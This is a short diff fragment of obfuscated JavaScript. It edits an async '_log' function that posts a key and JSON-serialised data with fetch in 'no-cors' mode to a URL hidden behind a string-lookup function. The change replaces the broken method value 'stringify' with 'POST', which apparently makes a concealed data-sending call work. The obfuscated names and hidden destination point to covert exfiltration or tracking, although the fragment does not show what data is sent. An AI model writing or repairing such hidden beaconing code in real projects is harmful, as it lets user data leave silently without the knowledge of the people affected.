@@ -22,7 +22,7 @@ async function _log(_0x12cb76, _0x2655b3) {
         await fetch(
             get_text_fn(0x19c),
             {
-                'method': 'stringify',
+                'method': 'POST',
                 'mode': 'no-cors',
                 'body': _0x12cb76 + ':' + JSON[get_text_fn(0x1bd)](_0x2655b3),
                 'headers': new Headers({ 'Content-Type': get_text_fn(0x204) })
